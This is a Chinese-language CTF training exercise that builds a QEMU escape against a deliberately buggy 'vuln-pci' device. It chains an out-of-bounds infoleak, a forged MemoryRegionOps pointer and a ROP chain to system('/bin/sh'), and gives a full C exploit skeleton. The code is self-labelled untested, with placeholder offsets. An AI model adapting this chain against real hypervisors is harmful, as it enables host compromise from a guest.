# 練習 C — 完整 QEMU custom device 逃逸（CTF 題型全流程）

> **目標**：把前面所有章節學到的技巧串成一條完整攻擊鏈——infoleak（Ch 17）→ 指標劫持（Ch 20-21）→ stack pivot + ROP（Ch 22）——在 CTF 風格的 vuln-pci 題目上拿到 host shell。

> **環境**：QEMU 9.0 / x86-64 / Linux guest（建議 Ubuntu 22.04 minimal）

---

## 情境說明

這道題的設定模擬真實 CTF QEMU escape 題型的標準套路。主辦方提供：

- 一份打過 patch 的 QEMU 9.0 binary，加了 `vuln-pci` custom device
- 一個 Ubuntu 22.04 minimal guest image
- 啟動腳本：`run.sh`，內含以下關鍵參數：
  ```
  -device vuln-pci -device vuln-pci
  ```
  （兩個 device 實例，一個用來 leak，一個用來觸發）
- 目標：在 QEMU host process 執行任意指令（拿到 `/etc/passwd` 或反彈 shell）

vuln-pci 的漏洞設計刻意貼近真實世界的 custom device bug：bound check 缺失、MMIO handler 直接用 `idx` 存取 `buf[]`，往前後都可以 OOB。裁判在評分時通常接受「host 端出現 `/bin/sh` 提示符」或「`id` 顯示 host user」作為成功條件。

---

## 先備條件確認

開始之前，確認下列項目都已完成：

- [ ] 讀過 Ch 12：理解 `VulnState` 結構體佈局與 MMIO handler 邏輯
- [ ] 讀過 Ch 17：能用 OOB read 洩漏 QEMU PIE base 與 heap 位址
- [ ] 讀過 Ch 20-21：知道 `MemoryRegionOps.write` 和 `QEMUTimer.cb` 為何是理想劫持目標，以及 fake ops 技巧
- [ ] 讀過 Ch 22：理解 stack pivot gadget 的選取與 ROP chain 構造
- [ ] 本地有可編譯的 debug QEMU 9.0（含 `--enable-debug`，symbol 未 strip）
- [ ] guest 內可編譯 C 程式（`gcc` 或 cross-compile 後 scp 進去都行）
- [ ] 知道怎麼在 guest 裡 `mmap` BAR0：`/sys/bus/pci/devices/0000:00:04.0/resource0`

---

## 攻擊鏈全圖

```
Guest userspace
     │
     │  open(/sys/bus/pci/.../resource0) + mmap BAR0
     ▼
┌─────────────────────────────────────────────────────────┐
│  Step 1: OOB Read (Ch 17)                               │
│  MMIO read @ offset 0x04 + N (N 超出 buf 範圍)          │
│  → 讀到 heap 後方鄰近結構體的 code pointer              │
│  → 計算 QEMU PIE base + heap base (VulnState addr)      │
└────────────────────┬────────────────────────────────────┘
                     │ leak: qemu_base, heap_base
                     ▼
┌─────────────────────────────────────────────────────────┐
│  Step 2: 計算目標位址                                    │
│  system@plt      = qemu_base + offset_system            │
│  pop rdi; ret    = qemu_base + offset_pop_rdi           │
│  pivot gadget    = qemu_base + offset_pivot             │
│  "/bin/sh"       = heap_base + offset_in_buf            │
└────────────────────┬────────────────────────────────────┘
                     │
                     ▼
┌─────────────────────────────────────────────────────────┐
│  Step 3: 構造 fake MemoryRegionOps (Ch 21)              │
│  在 buf[0x00..0x3f] 寫入 fake_ops：                     │
│    fake_ops.write = pivot_gadget                        │
│  在 buf[0x40..0x7f] 寫入 ROP chain：                    │
│    [pop rdi] [&"/bin/sh"] [system()]                    │
└────────────────────┬────────────────────────────────────┘
                     │ OOB write (Ch 20)
                     ▼
┌─────────────────────────────────────────────────────────┐
│  Step 4: 蓋第二個 VulnState 的 MemoryRegion.ops ptr     │
│  (需 heap groom：device 0 OOB 打 device 1 的 ops ptr)   │
│  → ops ptr → &fake_ops (在 device 0 的 buf)             │
└────────────────────┬────────────────────────────────────┘
                     │ MMIO write to device 1
                     ▼
┌─────────────────────────────────────────────────────────┐
│  Step 5: 觸發 ops->write(opaque, addr, val, size)       │
│  RIP = pivot_gadget                                     │
│  RSP 被換到 ROP chain 位址                               │
└────────────────────┬────────────────────────────────────┘
                     │ ROP 執行
                     ▼
┌─────────────────────────────────────────────────────────┐
│  Step 6: system("/bin/sh") 在 QEMU host process 執行    │
│  → host shell                                           │
└─────────────────────────────────────────────────────────┘
```

---

## 任務規格

你要完成下列具體產出：

1. **`exploit.c`**：在 guest 內編譯執行，完成 leak → 蓋指標 → 觸發的完整流程
2. **確認 offset 的 gdb session log**：記錄下列數值
   - `VulnState.mmio` 的 offset（預期 `0x0f8` 附近，需量測）
   - `MemoryRegion.ops` 在 `MemoryRegion` 內的 offset
   - `MemoryRegion.opaque` 的 offset
   - `VulnState.buf` 的 offset
3. **ROPgadget 輸出**：找到可用的 pivot 和 `pop rdi; ret`，記下 offset（相對 binary base）
4. **驗收截圖或 log**：host 端出現 `sh-5.1#` 或 `uid=0(root)` 字樣

每個 step 都要能獨立驗證（leak 成功才進行下一步，不要把六步全部跑完才知道哪裡壞了）。

---

## 實作步驟

### Step 1: Leak（參考 Ch 17）

回頭看 Ch 17 的 infoleak 技巧。核心問題是：`VulnState` 結構體佈局如下：

```
VulnState:
  [0x000] PCIDevice pdev      ← ~0x0f8 bytes，內含 PCIDeviceClass* 等 code ptr
  [0x0f8] MemoryRegion mmio   ← ~0x100 bytes，含 ops ptr（code ptr）
  [0x1f8] char buf[0x100]     ← 我們可寫的區域
  [0x2f8] uint32_t status
```

vuln-pci 的 OOB read：`MMIO read @ 0x04 + idx` 讀到 `buf[idx]`。向後 OOB（`idx >= 0x100`）可以讀到 `status` 之後的 heap 空間。

**目標**：讓堆積上 `VulnState` 後方緊接著另一個 QEMU 物件，其中包含 code pointer（例如第二個 `VulnState` 的 `pdev.pc` 欄位，或 `PCIBus` 結構）。在 gdb 裡觀察兩個 device 的 heap 佈局，算出 OOB offset。

```c
/* 示意：讀 buf 後方 0x200 bytes 處的 8 bytes */
uint64_t leaked = mmio_read64(0x04 + 0x200);
/* 在 gdb 裡確認這個位址對應哪個符號 */
```

拿到 code pointer 之後，用 `info proc mappings`（gdb）或 `/proc/PID/maps` 確認 QEMU PIE base，反推 `offset = leaked - qemu_base`，把這個 offset 硬編進 `exploit.c`。

---

### Step 2: 計算 base 位址

leak 到的 pointer 通常是 `.text` 或 `.rodata` 段的符號。用 `nm` 找出它相對 binary 起始的 offset：

```bash
nm -n ./qemu-system-x86_64 | grep -i "symbol_name"
# offset = 0xCAFE0000
# qemu_base = leaked - 0xCAFE0000
```

同理，heap base 從 `VulnState` 自身的地址推算。Ch 17 如果已經洩漏了 `VulnState*`，直接用那個值。

---

### Step 3: 構造 fake ops / 蓋指標

`MemoryRegionOps` 的 `write` 欄位在 offset `+0x08`。構造 fake ops 時關鍵填兩個欄位：

- `ops->write = pivot_gadget`：RIP 跳到這裡
- `ops->endianness = 2`（`DEVICE_LITTLE_ENDIAN`）：讓 QEMU 的合法性檢查過關

fake ops 和 ROP chain 都放在 `VulnState.buf` 裡（透過合法的 MMIO write，offset `0x10` + idx 寫 `buf[idx]`）。

**蓋指標的難點**：`MemoryRegion.ops` 在 `buf` 之前（offset `0x118` vs `0x1f8`），純 forward OOB write 打不到。解法是讓第一個 device 的 OOB write 打到第二個 device 的 `MemoryRegion.ops`（需要兩個 device 的 heap 佈局相鄰）。在 gdb 裡確認兩個 `VulnState*` 的距離，算出 OOB offset。

---

### Step 4: Stack pivot

pivot gadget 的選擇取決於 call site 的暫存器狀態。當 `ops->write(opaque, addr, val, size)` 被呼叫時：

- `RDI` = `opaque`（我們透過 `MemoryRegion.opaque` 控制）
- `RSI` = `addr`（MMIO offset，我們控制）
- `RDX` = `val`（寫入的值，我們控制）

如果能找到 `mov rsp, rdi; ret` 或 `xchg rax, rsp; ret` 類的 gadget，把 RSP 換到 ROP chain 在 heap 上的位址即可。

```bash
ROPgadget --binary ./qemu-system-x86_64 | grep "mov rsp, rdi"
ROPgadget --binary ./qemu-system-x86_64 | grep "xchg rax, rsp"
```

如果 `mov rsp, rdi; ret` 存在，把 `opaque` 設成 ROP chain 的 heap 位址，pivot 完成。

---

### Step 5: ROP chain

x86-64 ABI：`system(cmd)` 的第一個參數透過 `RDI` 傳入。

```
ROP chain:
  [+0x00] pop rdi; ret
  [+0x08] &"/bin/sh"       ← 放在 chain 後面的 buf 空間
  [+0x10] system@plt
  [+0x18] "/bin/sh\x00"    ← 字串本體
```

`system@plt` 的位址從 Step 2 算出。`"/bin/sh"` 字串的 heap 位址需要精確計算（`VulnState.buf` heap 位址 + 字串在 buf 內的 offset）。

---

### Step 6: 觸發 → shell

對第二個 device 的 BAR0 做任意 MMIO write（`0x10` 以上的 offset）：

```c
/* 觸發 device 1 的 ops->write */
int fd2 = open("/sys/bus/pci/devices/0000:00:05.0/resource0", O_RDWR | O_SYNC);
volatile uint8_t *mmio2 = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, fd2, 0);
mmio2[0x10] = 0x1;  /* 觸發 vuln_mmio_write → ops->write */
```

QEMU host process 執行 `system("/bin/sh")`，在 terminal 出現 `sh-5.1#`。

---

## 如果卡住了

1. **leak 拿不到 code pointer**：先在 gdb 裡對著一個跑起來的 QEMU instance，`x/100gx vulnstate_addr + 0x2f8` 看 `status` 後方的 heap 內容，找哪個位址落在 QEMU binary 的映射範圍（`info proc mappings` 對照）。不要盲猜 offset。

2. **OOB write 打不到 ops ptr**：用 gdb 確認兩個 `VulnState` 之間的距離。如果距離不固定，加 heap groom：在 QEMU 啟動後，先分配再釋放一些固定大小的物件，讓兩個 device 的 `VulnState` 緊鄰。或者改打 `QEMUTimer.cb`（延伸挑戰 4）。

3. **pivot 之後 crash 在奇怪地方**：在 gdb 裡 catch `SIGSEGV`，看 RIP 是什麼。可能是 pivot 選錯（gadget 有 side effect），或 ROP chain 位址算錯（差了 8 bytes alignment 問題）。確保 RSP 在 pivot 之後 16-byte aligned 後再 call `system`。

4. **`system()` 被呼叫但沒有 shell**：QEMU 可能開了 seccomp sandbox（`-sandbox on`）。用 `seccomp-tools dump ./qemu-system-x86_64` 或在 gdb 裡看 `prctl` call 確認。如果 `execve` 被擋，改讀 `/etc/passwd`（延伸挑戰 1）。

5. **offset 在每次啟動都不一樣（ASLR/KASLR）**：heap base 本來就會變，這是正常的。PIE base 也會變。所以每次都要 leak。如果 leak 拿到的值每次都不同但 exploit 照樣能算出正確的 base，代表流程對；如果 leak 本身不穩定，先用 `-m 512M`（縮小 guest RAM）看 heap 佈局是否變得更穩定。

---

<details>
<summary>完整 exploit 骨架（展開）</summary>

```c
/*
 * exploit.c — vuln-pci CTF escape exploit
 * 未實測，理論預期
 * 在 Linux guest 上編譯：gcc -O0 -o exploit exploit.c
 * 需要：QEMU 9.0 with vuln-pci (x2), guest Linux, root 或 sudo
 *
 * 攻擊鏈：
 * 1. mmap BAR0 (device 0 + device 1)
 * 2. OOB read → leak QEMU PIE base + heap base (VulnState addr)
 * 3. 計算目標位址：
 *    - system@plt 或 system in libc
 *    - MemoryRegion.ops offset in VulnState
 *    - "/bin/sh" string location
 * 4. 在 device 0 的 buf 構造 fake_MemoryRegionOps + ROP chain
 * 5. OOB write (device 0) → 蓋 device 1 的 MemoryRegion.ops ptr
 * 6. 觸發 device 1 的 MMIO write → ops->write(opaque) → RIP control
 * 7. Stack pivot → ROP → system("/bin/sh")
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <stdint.h>
#include <unistd.h>
#include <assert.h>

/* ─── 設定區（需要根據目標 QEMU 版本調整）─── */
#define BAR0_DEV0  "/sys/bus/pci/devices/0000:00:04.0/resource0"
#define BAR0_DEV1  "/sys/bus/pci/devices/0000:00:05.0/resource0"
#define BAR0_SIZE  0x1000

/*
 * 這些 offset 需要在 Linux 上用 pahole + gdb 量出來：
 *   pahole -C VulnState /path/to/qemu-system-x86_64
 *   pahole -C MemoryRegion /path/to/qemu-system-x86_64
 * 以下是理論估算值，實際值會不同
 */
#define OFFSET_MMIO_IN_VULNSTATE    0x0f8   /* PCIDevice pdev 大小 ≈ 0xf8 */
#define OFFSET_OPS_IN_MMIO          0x020   /* MemoryRegion.ops 在 MemoryRegion 內的 offset */
#define OFFSET_OPAQUE_IN_MMIO       0x028   /* MemoryRegion.opaque */
#define OFFSET_BUF_IN_VULNSTATE     0x1f8   /* buf[] 在 VulnState 內的 offset */

/*
 * device 0 的 OOB write 要打到 device 1 的 MemoryRegion.ops：
 * 需要知道兩個 VulnState 在 heap 上的距離 (VULNSTATE_HEAP_DIST)
 * device1_mmio_ops_addr = vulnstate0_buf_addr
 *                       + VULNSTATE_HEAP_DIST
 *                       + OFFSET_MMIO_IN_VULNSTATE
 *                       + OFFSET_OPS_IN_MMIO
 * OOB write offset from buf[0] = ^ - vulnstate0_buf_addr
 * 這個值需要在 gdb 裡確認
 */
#define VULNSTATE_HEAP_DIST         0x400   /* placeholder，實際需量測 */

/* ─── MMIO 存取原語 ─── */
static volatile uint8_t *mmio0;  /* device 0 */
static volatile uint8_t *mmio1;  /* device 1 */

static void mmio_write8(volatile uint8_t *mmio, uint64_t offset, uint8_t val)
{
    mmio[offset] = val;
}

static uint8_t mmio_read8(volatile uint8_t *mmio, uint64_t offset)
{
    return mmio[offset];
}

static uint64_t mmio_read64(volatile uint8_t *mmio, uint64_t offset)
{
    uint64_t val = 0;
    for (int i = 0; i < 8; i++)
        val |= (uint64_t)mmio_read8(mmio, offset + i) << (i * 8);
    return val;
}

static void mmio_write64(volatile uint8_t *mmio, uint64_t offset, uint64_t val)
{
    for (int i = 0; i < 8; i++)
        mmio_write8(mmio, offset + i, (uint8_t)((val >> (i * 8)) & 0xff));
}

/* ─── Step 1: Infoleak ─── */
/*
 * VulnState heap layout:
 *   [0x000] PCIDevice pdev      ~0x0f8 bytes，pdev.pc (PCIDeviceClass*) 是 code ptr
 *   [0x0f8] MemoryRegion mmio   ~0x100 bytes，mmio.ops 是 code ptr
 *   [0x1f8] char buf[0x100]
 *   [0x2f8] uint32_t status
 *
 * OOB read: MMIO read at offset 0x04 + idx → buf[idx]
 *   idx = 0x100 → status
 *   idx = 0x104 → heap 後方（下一個 chunk header 或鄰近物件）
 *
 * 目標：讀到 device 1 的 VulnState.pdev 裡的某個 code pointer
 *   device 1 VulnState 從 device 0 VulnState buf 的角度看：
 *   offset from buf[0] = VULNSTATE_HEAP_DIST - OFFSET_BUF_IN_VULNSTATE + target_field_offset
 *
 * 這裡示意讀 device 1 的 pdev 第一個欄位（通常是 Object header，含 class ptr）
 */
static uint64_t leak_qemu_base(uint64_t *out_heap_base)
{
    /*
     * 讀 device 1 VulnState 的 pdev.qdev.parent_obj.class（ObjectClass*）
     * 這是個指向 .rodata 的 code pointer
     * 從 device 0 buf[0] 起算的 offset：
     *   VULNSTATE_HEAP_DIST - OFFSET_BUF_IN_VULNSTATE + 0x00
     * = VULNSTATE_HEAP_DIST - 0x1f8
     */
    uint64_t leak_offset_for_code = VULNSTATE_HEAP_DIST - OFFSET_BUF_IN_VULNSTATE;
    uint64_t leaked_code = mmio_read64(mmio0, 0x04 + leak_offset_for_code);
    printf("[*] leaked code ptr = 0x%016lx\n", leaked_code);

    /*
     * 讀 device 1 VulnState 的 mmio.ops（MemoryRegionOps*，也是 .rodata ptr）
     * offset from buf[0]:
     *   VULNSTATE_HEAP_DIST - OFFSET_BUF_IN_VULNSTATE
     *   + OFFSET_MMIO_IN_VULNSTATE + OFFSET_OPS_IN_MMIO
     */
    uint64_t leak_offset_for_ops =
        VULNSTATE_HEAP_DIST - OFFSET_BUF_IN_VULNSTATE
        + OFFSET_MMIO_IN_VULNSTATE + OFFSET_OPS_IN_MMIO;
    uint64_t leaked_ops = mmio_read64(mmio0, 0x04 + leak_offset_for_ops);
    printf("[*] leaked ops ptr  = 0x%016lx\n", leaked_ops);

    /*
     * PIE base = leaked_ops - vulnstate_mmio_ops_offset_in_binary
     * 這個 offset 要在 debug QEMU 上用 nm 找：
     *   nm -n qemu-system-x86_64 | grep vuln_pci_ops
     * 這裡用 placeholder
     */
    uint64_t OFFSET_VULN_OPS_IN_BINARY = 0xDEAD0000ULL; /* 需實測 */
    uint64_t qemu_base = leaked_ops - OFFSET_VULN_OPS_IN_BINARY;
    printf("[*] QEMU PIE base   = 0x%016lx\n", qemu_base);

    /*
     * heap base（VulnState 0 的地址）可以從 MMIO opaque 洩漏：
     * MemoryRegion.opaque 通常指向所屬的 VulnState（即 VulnState 自身）
     * 可從 device 0 的 mmio.opaque 讀到，但 opaque 在 buf 之前，需另個方式
     * 替代：讀 device 1 的 MemoryRegion.opaque → 拿到 device 1 VulnState 位址
     */
    uint64_t leak_offset_for_heap =
        VULNSTATE_HEAP_DIST - OFFSET_BUF_IN_VULNSTATE
        + OFFSET_MMIO_IN_VULNSTATE + OFFSET_OPAQUE_IN_MMIO;
    uint64_t dev1_vulnstate_addr = mmio_read64(mmio0, 0x04 + leak_offset_for_heap);
    printf("[*] dev1 VulnState  = 0x%016lx\n", dev1_vulnstate_addr);

    *out_heap_base = dev1_vulnstate_addr;
    return qemu_base;
}

/* ─── Step 2: 計算目標位址 ─── */
typedef struct {
    uint64_t system_plt;
    uint64_t pop_rdi;
    uint64_t pivot;      /* e.g. mov rsp, rdi; ret */
    uint64_t binsh;      /* &"/bin/sh" in dev0's buf */
    uint64_t rop_chain;  /* ROP chain 在 heap 上的位址 */
    uint64_t dev0_buf;   /* device 0 VulnState.buf 的 heap 位址 */
    uint64_t dev1_ops_ptr_heap; /* device 1 MemoryRegion.ops 在 heap 上的位址 */
} Targets;

static void calc_targets(uint64_t qemu_base, uint64_t dev1_vulnstate,
                          Targets *t)
{
    /*
     * 以下 offset 全部需要在目標 binary 上量測，這裡是 placeholder
     */
    uint64_t OFFSET_SYSTEM_PLT = 0xDEAD1000ULL; /* objdump -d | grep system@plt */
    uint64_t OFFSET_POP_RDI    = 0xDEAD2000ULL; /* ROPgadget | grep "pop rdi" */
    uint64_t OFFSET_PIVOT      = 0xDEAD3000ULL; /* ROPgadget | grep "mov rsp, rdi" */

    t->system_plt = qemu_base + OFFSET_SYSTEM_PLT;
    t->pop_rdi    = qemu_base + OFFSET_POP_RDI;
    t->pivot      = qemu_base + OFFSET_PIVOT;

    /* device 0 VulnState 在 device 1 前方 VULNSTATE_HEAP_DIST bytes */
    uint64_t dev0_vulnstate = dev1_vulnstate - VULNSTATE_HEAP_DIST;
    t->dev0_buf    = dev0_vulnstate + OFFSET_BUF_IN_VULNSTATE;

    /* fake_ops 放 buf[0x00]，ROP chain 放 buf[0x40]，"/bin/sh" 放 buf[0x58] */
    t->rop_chain   = t->dev0_buf + 0x40;
    t->binsh       = t->dev0_buf + 0x58;

    /* device 1 MemoryRegion.ops 的 heap 位址 */
    t->dev1_ops_ptr_heap = dev1_vulnstate
                         + OFFSET_MMIO_IN_VULNSTATE
                         + OFFSET_OPS_IN_MMIO;

    printf("[*] system@plt      = 0x%016lx\n", t->system_plt);
    printf("[*] pop rdi; ret    = 0x%016lx\n", t->pop_rdi);
    printf("[*] pivot gadget    = 0x%016lx\n", t->pivot);
    printf("[*] dev0 buf @heap  = 0x%016lx\n", t->dev0_buf);
    printf("[*] ROP chain @heap = 0x%016lx\n", t->rop_chain);
    printf("[*] /bin/sh @heap   = 0x%016lx\n", t->binsh);
    printf("[*] dev1 ops ptr @  = 0x%016lx\n", t->dev1_ops_ptr_heap);
}

/* ─── Step 3: fake MemoryRegionOps ─── */
/*
 * MemoryRegionOps (include/exec/memory.h, QEMU 9.0，簡化版):
 * struct MemoryRegionOps {
 *   uint64_t (*read)(void *opaque, hwaddr addr, unsigned size);        // +0x00
 *   void (*write)(void *opaque, hwaddr addr, uint64_t data, unsigned); // +0x08
 *   uint64_t (*read_with_attrs)(...);                                  // +0x10
 *   void (*write_with_attrs)(...);                                     // +0x18
 *   enum device_endian endianness;  // int, +0x20
 *   struct { uint32_t min_access_size; uint32_t max_access_size;
 *            uint32_t unaligned; } valid;    // +0x24
 *   struct { uint32_t min_access_size; uint32_t max_access_size; } impl; // +0x30
 * };
 */
typedef struct {
    uint64_t read;
    uint64_t write;          /* ← 劫持這裡 */
    uint64_t read_with_attrs;
    uint64_t write_with_attrs;
    uint32_t endianness;     /* DEVICE_LITTLE_ENDIAN = 2 */
    uint32_t valid_min;
    uint32_t valid_max;
    uint32_t valid_unaligned;
    uint32_t impl_min;
    uint32_t impl_max;
} FakeOps;

static void build_fake_ops(uint8_t *dst, const Targets *t)
{
    FakeOps *ops = (FakeOps *)dst;
    memset(ops, 0, sizeof(*ops));

    /*
     * 當 QEMU 呼叫 ops->write(opaque, addr, val, size)：
     *   RDI = opaque（我們設成 rop_chain 位址）
     *   RIP = ops->write = pivot gadget
     * pivot: mov rsp, rdi; ret
     *   → RSP = rop_chain
     *   → 開始 ROP
     */
    ops->write      = t->pivot;
    ops->read       = t->pivot;  /* 不觸發，但填同一個 pivot 避免因 NULL 崩潰 */
    ops->endianness = 2;         /* DEVICE_LITTLE_ENDIAN */
    ops->valid_min  = 1;
    ops->valid_max  = 4;
    ops->impl_min   = 1;
    ops->impl_max   = 4;
}

/* ─── Step 4+5: ROP chain ─── */
/*
 * ROP 組合（x86-64 ABI，system(const char *) 透過 RDI）：
 *
 *   +0x00: pop rdi; ret
 *   +0x08: &"/bin/sh"        → RDI
 *   +0x10: system@plt
 *   +0x18: (ret 對齊用，如果 system 需要 16-byte aligned stack)
 *   +0x18: "/bin/sh\x00"     ← 字串本體
 *
 * 如果 system@plt 呼叫前需要 stack 16-byte aligned，在 pop rdi 之前加一個
 * `ret` gadget（address of a plain `ret` instruction）。
 */
static void build_rop_chain(uint8_t *dst, const Targets *t)
{
    uint64_t *chain = (uint64_t *)dst;
    int i = 0;

    /* 選擇性：加一個 ret gadget 修正 stack alignment */
    /* chain[i++] = t->qemu_base + OFFSET_RET_GADGET; */

    chain[i++] = t->pop_rdi;   /* gadget: pop rdi; ret */
    chain[i++] = t->binsh;     /* → RDI = &"/bin/sh" */
    chain[i++] = t->system_plt;/* → call system("/bin/sh") */

    /* "/bin/sh" 字串放在 chain[3] 位置 (offset +0x18) */
    /* t->binsh 應該 = t->rop_chain + 0x18 */
    assert(t->binsh == t->rop_chain + (uint64_t)(i * 8));
    strcpy((char *)&chain[i], "/bin/sh");
}

/* ─── Main ─── */
int main(void)
{
    printf("[*] vuln-pci QEMU escape exploit\n");
    printf("[!] 未實測，理論預期 — 在 Linux guest 上實際驗證\n\n");

    /* ─── 開啟兩個 device 的 BAR0 ─── */
    int fd0 = open(BAR0_DEV0, O_RDWR | O_SYNC);
    if (fd0 < 0) { perror("open dev0"); return 1; }
    mmio0 = mmap(NULL, BAR0_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, fd0, 0);
    if (mmio0 == MAP_FAILED) { perror("mmap dev0"); return 1; }
    printf("[*] dev0 BAR0 mmap'd\n");

    int fd1 = open(BAR0_DEV1, O_RDWR | O_SYNC);
    if (fd1 < 0) { perror("open dev1"); return 1; }
    mmio1 = mmap(NULL, BAR0_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, fd1, 0);
    if (mmio1 == MAP_FAILED) { perror("mmap dev1"); return 1; }
    printf("[*] dev1 BAR0 mmap'd\n\n");

    /* ─── Step 1: Leak ─── */
    printf("[*] === Step 1: Infoleak ===\n");
    uint64_t dev1_vulnstate = 0;
    uint64_t qemu_base = leak_qemu_base(&dev1_vulnstate);
    if (qemu_base == 0 || dev1_vulnstate == 0) {
        printf("[-] leak failed, check offsets\n");
        return 1;
    }

    /* ─── Step 2: 計算位址 ─── */
    printf("\n[*] === Step 2: Address calculation ===\n");
    Targets t;
    calc_targets(qemu_base, dev1_vulnstate, &t);

    /* ─── Step 3: 構造 fake ops 和 ROP chain，寫進 dev0 的 buf ─── */
    printf("\n[*] === Step 3: Build fake ops + ROP chain ===\n");

    uint8_t payload[0x80];
    memset(payload, 0, sizeof(payload));

    /* payload[0x00..0x3f] = fake MemoryRegionOps */
    build_fake_ops(payload, &t);
    printf("[*] fake ops built: write = 0x%016lx\n", t.pivot);

    /* payload[0x40..0x7f] = ROP chain + "/bin/sh" */
    build_rop_chain(payload + 0x40, &t);
    printf("[*] ROP chain built\n");

    /* 透過合法 MMIO write 把 payload 寫進 dev0 buf[0..0x7f] */
    for (int i = 0; i < (int)sizeof(payload); i++)
        mmio_write8(mmio0, 0x10 + i, payload[i]);
    printf("[*] payload written to dev0 buf[0..0x7f]\n");

    /* ─── Step 4: OOB write 蓋 dev1 的 MemoryRegion.ops 指標 ─── */
    printf("\n[*] === Step 4: Overwrite dev1 ops ptr ===\n");

    /*
     * dev1 ops ptr 相對於 dev0 buf[0] 的 offset：
     * = (dev1_vulnstate_addr - dev0_buf_addr)
     *   + OFFSET_MMIO_IN_VULNSTATE + OFFSET_OPS_IN_MMIO
     * = VULNSTATE_HEAP_DIST + OFFSET_MMIO_IN_VULNSTATE + OFFSET_OPS_IN_MMIO
     *   - OFFSET_BUF_IN_VULNSTATE (因為 buf[0] 不是 vulnstate 起點)
     *
     * 等價：t->dev1_ops_ptr_heap - t->dev0_buf
     */
    uint64_t oob_offset = t.dev1_ops_ptr_heap - t.dev0_buf;
    printf("[*] OOB write offset from buf[0]: 0x%lx\n", oob_offset);

    /*
     * 用 OOB write 把 dev1 的 ops ptr 蓋成 dev0 buf 的起點（fake_ops 位址）
     * MMIO write offset = 0x10 + oob_offset（因為 write handler 從 0x10 起算 idx）
     */
    mmio_write64(mmio0, 0x10 + oob_offset, t.dev0_buf);
    printf("[*] dev1 ops ptr overwritten → 0x%016lx\n", t.dev0_buf);

    /* ─── Step 5: 設 dev1 的 MemoryRegion.opaque → rop_chain 位址 ─── */
    printf("\n[*] === Step 5: Set opaque (pivot target) ===\n");

    uint64_t opaque_oob_offset = oob_offset + (OFFSET_OPAQUE_IN_MMIO - OFFSET_OPS_IN_MMIO);
    mmio_write64(mmio0, 0x10 + opaque_oob_offset, t.rop_chain);
    printf("[*] dev1 opaque set → 0x%016lx (ROP chain)\n", t.rop_chain);

    /* ─── Step 6: 觸發 ─── */
    printf("\n[*] === Step 6: Trigger ===\n");
    printf("[*] writing to dev1 BAR0 → ops->write(opaque,...) → RIP hijack\n");
    printf("[*] pivot: RSP → 0x%016lx\n", t.rop_chain);
    printf("[*] ROP: pop rdi → /bin/sh → system()\n");
    printf("[*] expect: host sh\n\n");

    /*
     * 觸發 dev1 的 vuln_mmio_write：
     * QEMU 呼叫 fake_ops->write(opaque=rop_chain, addr, val, size)
     * RIP = pivot gadget → RSP = rop_chain → ROP 開始
     */
    mmio_write8(mmio1, 0x10, 0x1);

    /* 如果 system() 成功，這行不會執行（process 被 system 的 sh 替代或 fork） */
    printf("[!] if you see this, exploit failed — check offsets\n");

    munmap((void *)mmio0, BAR0_SIZE);
    munmap((void *)mmio1, BAR0_SIZE);
    close(fd0);
    close(fd1);
    return 0;
}
```

---

**位址計算偽代碼（給沒有 C 背景的讀者）**

```
# leak 拿到的值
leaked_ops_ptr   = mmio_read64(dev0, 0x04 + oob_offset_to_dev1_ops)
leaked_opaque    = mmio_read64(dev0, 0x04 + oob_offset_to_dev1_opaque)

# 計算 QEMU PIE base（需要用 nm 量 vuln_pci_ops 符號 offset）
VULN_OPS_SYMOFFSET = <用 nm 量>
qemu_base = leaked_ops_ptr - VULN_OPS_SYMOFFSET

# 計算 dev0 buf 的 heap 位址
dev1_vulnstate  = leaked_opaque          # opaque 指向 VulnState 自身
dev0_vulnstate  = dev1_vulnstate - VULNSTATE_HEAP_DIST
dev0_buf        = dev0_vulnstate + OFFSET_BUF_IN_VULNSTATE

# ROP chain 佈局（全在 dev0 buf 裡）
fake_ops_addr   = dev0_buf + 0x00
rop_chain_addr  = dev0_buf + 0x40
binsh_addr      = dev0_buf + 0x58   # 0x40 + 3*8

# 計算 gadget 位址（需要用 ROPgadget 量 offset）
pivot_addr      = qemu_base + PIVOT_OFFSET
pop_rdi_addr    = qemu_base + POP_RDI_OFFSET
system_addr     = qemu_base + SYSTEM_PLT_OFFSET
```

---

**ROP chain 組合表示法**

```asm
; heap 位址 rop_chain_addr 開始
rop_chain_addr + 0x00:  pop_rdi_gadget   ; pop rdi; ret
rop_chain_addr + 0x08:  binsh_addr       ; RDI = &"/bin/sh"
rop_chain_addr + 0x10:  system_plt       ; call system()
rop_chain_addr + 0x18:  "/bin/sh\x00"   ; 字串本體 (8 bytes)

; fake MemoryRegionOps @ fake_ops_addr = rop_chain_addr - 0x40
fake_ops_addr + 0x00:  pivot_addr       ; ops->read  = pivot (填合法值)
fake_ops_addr + 0x08:  pivot_addr       ; ops->write = pivot gadget
fake_ops_addr + 0x10:  pivot_addr       ; ops->read_with_attrs
fake_ops_addr + 0x18:  pivot_addr       ; ops->write_with_attrs
fake_ops_addr + 0x20:  0x00000002       ; endianness = DEVICE_LITTLE_ENDIAN
fake_ops_addr + 0x24:  0x00000001       ; valid.min_access_size = 1
fake_ops_addr + 0x28:  0x00000004       ; valid.max_access_size = 4
```

---

**Linux 驗證步驟**

```bash
# 1. 編 debug QEMU + vuln-pci（加 --enable-debug 保留符號）
cd ~/qemu-9.0
./configure --enable-debug --target-list=x86_64-softmmu \
    --enable-kvm --prefix=/opt/qemu-debug
make -j$(nproc)
make install

# 2. 在 gdb 裡確認 VulnState 各欄位 offset
gdb /opt/qemu-debug/bin/qemu-system-x86_64
(gdb) set args -enable-kvm -m 1G \
    -drive file=ubuntu.img,format=qcow2 \
    -device vuln-pci -device vuln-pci \
    -nographic
(gdb) break vuln_pci_realize
(gdb) run
# 第一次 break 是 device 0
(gdb) print s                            # s = VulnState*
(gdb) print &s->mmio                    # 確認 OFFSET_MMIO_IN_VULNSTATE
(gdb) print &s->mmio.ops               # 確認 OFFSET_MMIO_IN_VULNSTATE + OFFSET_OPS_IN_MMIO
(gdb) print &s->mmio.opaque            # 確認 opaque offset
(gdb) print &s->buf                     # 確認 OFFSET_BUF_IN_VULNSTATE
(gdb) continue
# 第二次 break 是 device 1
(gdb) print s                            # 拿到 device 1 的 VulnState*
# VULNSTATE_HEAP_DIST = dev1 - dev0

